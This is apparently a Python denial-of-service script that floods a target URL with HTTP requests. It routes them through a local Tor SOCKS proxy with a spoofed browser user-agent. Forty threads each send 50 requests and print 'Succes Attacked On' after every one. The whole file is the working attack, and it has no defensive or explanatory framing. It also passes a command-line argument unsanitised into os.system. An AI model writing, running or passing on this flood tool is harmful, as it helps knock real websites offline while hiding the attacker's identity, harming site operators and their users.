import requests
import sys
import os
from threading import Thread
from time import sleep

url = sys.argv[1]
proxyTor = "socks5://127.0.0.1:" + sys.argv[2]
optionsProxy = {"https":proxyTor,
                 "http":proxyTor}
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36'
}                
def threaded_function(arg):
    for i in range(arg):
        requests.get(url,proxies=optionsProxy,headers=headers)
        os.system("echo Succes Attacked On "+sys.argv[2])

thread = Thread(target = threaded_function, args = (50,))
thread2 = Thread(target = threaded_function, args = (50,))
thread3 = Thread(target = threaded_function, args = (50,))
thread4 = Thread(target = threaded_function, args = (50,))
thread5 = Thread(target = threaded_function, args = (50,))
thread6 = Thread(target = threaded_function, args = (50,))
thread7 = Thread(target = threaded_function, args = (50,))
thread8 = Thread(target = threaded_function, args = (50,))
thread9 = Thread(target = threaded_function, args = (50,))
thread10 = Thread(target = threaded_function, args = (50,))
thread11 = Thread(target = threaded_function, args = (50,))
thread12 = Thread(target = threaded_function, args = (50,))
thread13 = Thread(target = threaded_function, args = (50,))
thread14 = Thread(target = threaded_function, args = (50,))
thread15 = Thread(target = threaded_function, args = (50,))
thread16 = Thread(target = threaded_function, args = (50,))
thread17 = Thread(target = threaded_function, args = (50,))
thread18 = Thread(target = threaded_function, args = (50,))
thread19 = Thread(target = threaded_function, args = (50,))
thread20 = Thread(target = threaded_function, args = (50,))
thread21 = Thread(target = threaded_function, args = (50,))
thread22 = Thread(target = threaded_function, args = (50,))
thread23 = Thread(target = threaded_function, args = (50,))
thread24 = Thread(target = threaded_function, args = (50,))
thread25 = Thread(target = threaded_function, args = (50,))
thread26 = Thread(target = threaded_function, args = (50,))
thread27 = Thread(target = threaded_function, args = (50,))
thread28 = Thread(target = threaded_function, args = (50,))
thread29 = Thread(target = threaded_function, args = (50,))
thread30 = Thread(target = threaded_function, args = (50,))
thread31 = Thread(target = threaded_function, args = (50,))
thread32 = Thread(target = threaded_function, args = (50,))
thread33 = Thread(target = threaded_function, args = (50,))
thread34 = Thread(target = threaded_function, args = (50,))
thread35 = Thread(target = threaded_function, args = (50,))
thread36 = Thread(target = threaded_function, args = (50,))
thread37 = Thread(target = threaded_function, args = (50,))
thread38 = Thread(target = threaded_function, args = (50,))
thread39 = Thread(target = threaded_function, args = (50,))
thread40 = Thread(target = threaded_function, args = (50,))

thread.start()
thread2.start()
thread3.start()
thread4.start()
thread5.start()
thread6.start()
thread7.start()
thread8.start()
thread9.start()
thread10.start()
thread11.start()
thread12.start()
thread13.start()
thread14.start()
thread15.start()
thread16.start()
thread17.start()
thread18.start()
thread19.start()
thread20.start()
thread21.start()
thread22.start()
thread23.start()
thread24.start()
thread25.start()
thread26.start()
thread27.start()
thread28.start()
thread29.start()
thread30.start()
thread31.start()
thread32.start()
thread33.start()
thread34.start()
thread35.start()
thread36.start()
thread37.start()
thread38.start()
thread39.start()
thread40.start()
